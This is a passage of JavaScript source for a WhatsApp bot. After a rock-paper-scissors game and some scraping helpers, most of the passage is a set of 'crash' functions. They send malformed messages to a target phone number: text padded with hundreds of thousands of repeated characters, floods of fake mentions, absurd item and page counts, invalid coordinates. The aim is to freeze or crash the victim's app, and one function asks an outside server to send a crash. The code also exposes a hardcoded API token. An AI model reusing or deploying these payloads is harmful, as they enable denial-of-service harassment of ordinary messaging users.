if (!roof.pilih2) byxz.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
byxzreply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) byxz.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
byxz.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}

//=================================================//
async function ssweb(url, device = 'desktop'){
return new Promise((resolve, reject) => {
const base = 'https://www.screenshotmachine.com'
const param = {
url: url,
device: device,
cacheLimit: 0
}
axios({url: base + '/capture.php',
method: 'POST',
data: new URLSearchParams(Object.entries(param)),
headers: {
'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
}
}).then((data) => {
const cookies = data.headers['set-cookie']
if (data.data.status == 'success') {
axios.get(base + '/' + data.data.link, {
headers: {
'cookie': cookies.join('')
},
responseType: 'arraybuffer'
}).then(({ data }) => {
result = {
status: 200,
result: data
}
resolve(result)
})
} else {
reject({ status: 404, statuses: `Link Error`, message: data.data })
}
}).catch(reject)
})
}

//=================================================//
async function diff(data) {
const response = await fetch(
"https://api-inference.huggingface.co/models/stablediffusionapi/lyrielv16",
{
headers: { Authorization: "Bearer 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" },
method: "POST",
body: JSON.stringify(data),
}
)
const result = await response.blob();
let arrayBuffer = await result.arrayBuffer();
const buffer = Buffer.from(arrayBuffer, 'base64')
return buffer
}

async function styletext(teks) {
return new Promise((resolve, reject) => {
axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
.then(({ data }) => {
let $ = cheerio.load(data)
let hasil = []
$('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
})
resolve(hasil)
})
})
}

//=================================================//
async function ephoto(url, texk) {
let form = new FormData()
let gT = await axios.get(url, {
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
}
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios.post(url, form, {
headers: {
...form.getHeaders(),
Accept: "*/*",
"Accept-Language": "en-US,en;q=0.9",
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
cookie: gT.headers["set-cookie"]?.join("; "),
}
});

//=================================================//
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
headers: {
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
cookie: gT.headers["set-cookie"].join("; ")
}
})
return build_server + data.image
}
//=================================================//
async function kontakcrsh(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "contactMessage": {
    "displayName": `🦠𝗩⃟⃜𝗼⃟𝗫 𝗭⃟⃝⃰𝗼⃛𝗻⃟𝗧⃞⃪𝗲⃟𝗫☠️`,
    "vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:0 Kontak  \nitem1.TEL;waid=628:+628\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:𝐀𝐭𝐭𝐚𝐜𝐤 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩\nX-WA-BIZ-NAME: Raditt\nEND:VCARD",
     }
  }
}
}), { userJid: target, quoted: kuwoted })
byxz.relayMessage(target, etc.message, { messageId: etc.key.id })
}
//=================================================//
async function trolicrsh(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "orderMessage": {
     "orderId": "449756950375071",
     "itemCount": 99999999999,	
     "status": "INQUIRY",
     "surface": "CATALOG",
     "message": `🦠𝗩⃟⃜𝗼⃟𝗫 𝗭⃟⃝⃰𝗼⃛𝗻⃟𝗧⃞⃪𝗲⃟𝗫☠️`,
     "jpegThumbnail": "",
     "orderTitle": `🦠𝗩⃟⃜𝗼⃟𝗫 𝗭⃟⃝⃰𝗼⃛𝗻⃟𝗧⃞⃪𝗲⃟𝗫☠️`,
     "sellerJid": "6281293063326@s.whatsapp.net",
     "token": "AR4TdfqMmZL1Hxo+dInFjtFNQAEBVE1RlecZAg8+2znapg==",
     }
  }	
}
}), { userJid: target, quoted: kuwoted })
byxz.relayMessage(target, etc.message, { messageId: etc.key.id })
}
//=================================================//
async function docufc(target) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "documentMessage": {
     "url": "https://mmg.whatsapp.net/d/f/AqdSNOaicHcP1vw_2qKlkG3AB8udWmo47Y9rmKjnLUss.enc",
     "mimetype": "*/*",
     "title": "IMG-20220802-WA0052.jpeg",
     "fileSha256": "iKJGFOiAl6DNllhc+9g7t8kwSKTl50TqZaIerGCa1OM=",
     "pageCount": 999999999,
     "mediaKey": "inQAnlhVJdu5dMUKr86iWUJnG/umzHeUGrlD7qqAN/I=",
     "fileName": `🔥 ☣️⃟𝗔𝗹⃨𝗯𝗲⃛𝗿⃨𝘁 𝗩𝗼⃨𝗫⃟☠️${button}`,
     "fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
     "directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
     "mediaKeyTimestamp": "1659416157",
     }
  }
}
}), { userJid: target })
byxz.relayMessage(target, etc.message, { messageId: etc.key.id })
}
//=================================================//
async function catalogcrsh(target, kuwoted) {
var messa = await prepareWAMessageMedia({ image: fs.readFileSync("./image/dev.jpg") }, { upload: byxz.waUploadToServer })
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "productMessage": {
  "product": {
  "productImage": messa.imageMessage,
  "productId": "4383282311765462",
  "title": `𝗭͢𝘅͛𝗣 𝗖͢𝗼ͮ𝗱͢𝗲ͯ𝗫`,
  "description": ``,
  "bodyText": `🦠𝗩⃟⃜𝗼⃟𝗫 𝗭⃟⃝⃰𝗼⃛𝗻⃟𝗧⃞⃪𝗲⃟𝗫☠️`,
  "footerText": `🦠𝗩⃟⃜𝗼⃟𝗫 𝗭⃟⃝⃰𝗼⃛𝗻⃟𝗧⃞⃪𝗲⃟𝗫☠️`,
  "productImageCount": 923456789,
  "firstImageId": 1,
  "retailerId": `AlbertZXP`,
  "url": "wa.me/6282291664759"
  },
  "businessOwnerJid": "6282291664759@s.whatsapp.net",
  }
}
}
}), { userJid: target, quoted: kuwoted })
byxz.relayMessage(target, etc.message, { messageId: etc.key.id })
}
//=================================================//
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍⿻A҉B҉Y҉ ҉C҉R҉A҉S҉H҉⿻╮⭑ ☠️⃰͜͡؜𝐀҉҉𝐛҉҉𝐲҉҉𝐲҉҉⭐️᜴ #𝐀𝐛𝐲𝐲𝐌𝐞𝐰𝐦𝐤ཀ͜͡✅⃟╮.xp`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await byxz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
//=================================================//
async function stuckgroup() {
  try {
    const messsage = {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: { degreesLatitude: 0, degreesLongitude: 0 },
              hasMediaAttachment: true,
            },
            body: { text: "📄𝗩𝗼𝗫 𝗔𝘁𝘁𝗮𝗰𝗸 𝗚𝗿𝗼𝘂𝗽☠️" + "@1".repeat(295000) },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [
                { groupJid: "1@newsletter", groupSubject: " xCeZeT " },
              ],
            },
          },
        },
      },
    };

    await byxz.relayMessage(m.key.remoteJid, messsage, {
      messageId: "ABCDEF1234567890",
    });
  } catch (err) {
    console.log(err);
  }
}
//=================================================//
async function aipong(target) {
await byxz.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
        const voxnul = {
			key: {
				remoteJid: 'p',
				fromMe: false,
				participant: '0@s.whatsapp.net'
			},
			message: {
				"interactiveResponseMessage": {
					"body": {
						"text": "Sent",
						"format": "DEFAULT"
					},
					"nativeFlowResponseMessage": {
						"name": "galaxy_message",
						"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐉𝐚𝐜𝐤 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@JackV2\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"𝗩⃟⃜𝗼⃟𝗫 𝗭⃟⃝⃰𝗼⃛𝗻⃟𝗧⃞⃪𝗲⃟𝗫${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
						"version": 3
					}
				}
			}
		}
//FUNC LAMA OLED
		async function sendCrash(target) {
			try {
				const newcrash = await fetchJson('http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=' + target);
				console.log(chalk.green("Send Bug By Abyy XvN🔥"));
				console.log(chalk.red("InVisible⚡"));
			} catch (error) {
				console.error("Error Fetching Crash:", error);
			}
		}
		
		async function locinvi(target) {
			var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "📄𝗫𝘃͍̈́͢𝗡 𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲⚡" + "@6282127568219".repeat(77777),
									"locationMessage": {
										"degreesLatitude": -999.03499999999999,
										"degreesLongitude": 922.999999999999,
										"name": "𝐁𝐲𝐱𝐱𝐇𝐚𝐫𝐝𝐞𝐫〽️",
										"address": "✨⃟༑⌁⃰𝐁𝐲𝐱𝐱 𝐇𝐚𝐫𝐝𝐞𝐫 ϟ〽️",
										"jpegThumbnail": ""
									},
									hasMediaAttachment: true
								},
								body: {
									text: ""
								},
								nativeFlowMessage: {
								    name: "call_permission_request",
									messageParamsJson: " 𝐁𝐲𝐱𝐱𝐇𝐚𝐫𝐝𝐞𝐫 𝐁𝐔𝐆 𝐕𝟕〽️ "
								},
							}
						}
					}
				}), {
					userJid: target
				}
			);
			await byxz.relayMessage(target, etc.message, { participant: { jid: target }
			});
		}
		
		const exclusv = '??????'.repeat(40000)
 
 async function frzloc(target) {
    await byxz.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "XvN tindex" + "ꦾ".repeat(50000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 50 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: exclusv }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null }
                  	);
			console.log(chalk.green("?AII?"));
    };
    
    async function xlocstuck(target) {
      await byxz.relayMessage(target, {
        'groupMentionedMessage': {
          'message': {
            'interactiveMessage': {
              'header': {
                'locationMessage': {
                  'degreesLatitude': 0,
                  'degreesLongitude': 0
                },
                'hasMediaAttachment': true
              },
              'body': {
                'text': "𝐙𝐄𝐍𝐎 𝐈𝐊𝐈 𝐂𝐀𝐊𝐊!!!" + 'ꦾ'.repeat(0x493e0)
              },
              'nativeFlowMessage': {},
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 5
                }, () => "1@newsletter"),
                'groupMentions': [{
                  'groupJid': '1@newsletter',
                  'groupSubject': " byxztrashboy "
                }]
              }
            }
          }
        }
      }, {
        'participant': {
          'jid': target
        }
      }, {
        'messageId': null
      });
    }
    
    async function stuck1(target) {
      let virtex = "𝐒𝐯 𝐃𝐫𝐚𝐲𝐌𝐨𝐝𝐬" + 'ꦾ'.repeat(300000);
      let mentionedJidArray = Array.from({
        'length': 500000
      }, () => '1' + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");
      let etc = {
        'groupMentionedMessage': {
          'message': {
            'listResponseMessage': {
              'title': " @120363326274964194@g.us",
              'listType': "SINGLE_SELECT",
              'singleSelectReply': {
                'selectedRowId': "Gateway To Hell"
              },
              'description': " @120363326274964194@g.us",
              'contextInfo': {
                'mentionedJid': mentionedJidArray,
                'groupMentions': [{
                  'groupJid': '120363326274964194@g.us',
                  'groupSubject': virtex
                }]
              }
            }
          }
        }
      };
      await byxz.relayMessage(target, {
        'participant': {
          'jid': target
        }
      }, {
        'messageId': null
      });
    }
    
async function DeathCarousel(target, kuwoted) {
  var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'locationMessage': {},
            'hasMediaAttachment': true
          },
          'body': {
            'text': "🗡️㍐𝐒 𝐤 ɣ 乙 𝐞 𝐭 ᵪₚᶜᶻᵃァ𝐆⃟Ǿ𝐃ͯͯͯˣʸᷦ" + "\0".repeat(50000)
          },
          'nativeFlowMessage': {
            'messageParamsJson': ''
          },
          'carouselMessage': {}
        }
      }
    }
  }), {
    'userJid': m.chat,
    'quoted': kuwoted
  });
  await byxz.relayMessage(target, etc.message, {
    'participant': {
      'jid': target
    },
    'messageId': etc.key.id
  });
}
		async function powered(target, ptcp = false) {
			await byxz.relayMessage(target, {
					extendedTextMessage: {
						text: "𝗘𝘅͆𝗰𝗹͖𝘂𝘀͢𝗶𝘃̈́𝗲" + "@1".repeat(45000),
						contextInfo: {
							mentionedJid: [
								"1@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "1@s.whatsapp.net",
							quotedMessage: {
								callLogMesssage: {
									isVideo: false,
									callOutcome: "5",
									durationSecs: "999",
									callType: "REGULAR",
									participants: [{
										jid: "1@s.whatsapp.net",
										callOutcome: "5"
									}]
								}
							},
							remoteJid: target,
							conversionSource: " X ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
							conversionDelaySeconds: 10,
							forwardingScore: 10,
							isForwarded: false,
							quotedAd: {
								advertiserName: " X ",
								mediaType: "IMAGE",
								jpegThumbnail: fs.readFileSync('./image/dev.jpg'),
								caption: " X "
							},
							placeholderKey: {
								remoteJid: "0@s.whatsapp.net",
								fromMe: false,
								id: "ABCDEF1234567890"
							},
							expiration: 86400,
							ephemeralSettingTimestamp: "1728090592378",
							ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							externalAdReply: {
								title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
								body: "xinnstyle.deobfuscator.biz.id",
								mediaType: "VIDEO",
								renderLargerThumbnail: true,
								previewType: "VIDEO",
								thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
								sourceType: " x ",
								sourceId: " x ",
								sourceUrl: "x",
								mediaUrl: "x",
								containsAutoReply: true,
								showAdAttribution: true,
								ctwaClid: "ctwa_clid_example",
								ref: "ref_example"
							},
							entryPointConversionSource: "entry_point_source_example",
							entryPointConversionApp: "entry_point_app_example",
							entryPointConversionDelaySeconds: 5,
							disappearingMode: {},
							actionLink: {
								url: "‎ ‎ "
							},
							groupSubject: " X ",
							parentGroupJid: "6287888888888-1234567890@g.us",
							trustBannerType: " X ",
							trustBannerAction: 1,
							isSampled: false,
							utm: {
								utmSource: " X ",
								utmCampaign: " X "
							},
							forwardedNewsletterMessageInfo: {
								newsletterJid: "6287888888888-1234567890@g.us",
								serverMessageId: 1,
								newsletterName: " X ",
								contentType: "UPDATE",
								accessibilityText: " X "
							},
							businessMessageForwardInfo: {
								businessOwnerJid: "0@s.whatsapp.net"
							},
							smbClientCampaignId: "smb_client_campaign_id_example",
							smbServerCampaignId: "smb_server_campaign_id_example",
							dataSharingContext: {
								showMmDisclosure: true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
			console.log(chalk.red("ATTACKING TARGET EX01"));
		};
		
		async function TxOs(target, ptcp = false) {
			await byxz.relayMessage(target, {
					extendedTextMessage: {
						text: "\n".repeat(100),
						contextInfo: {
							mentionedJid: [
								"6282291664759@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@s.whatsapp.net",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@s.whatsapp.net",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: target,
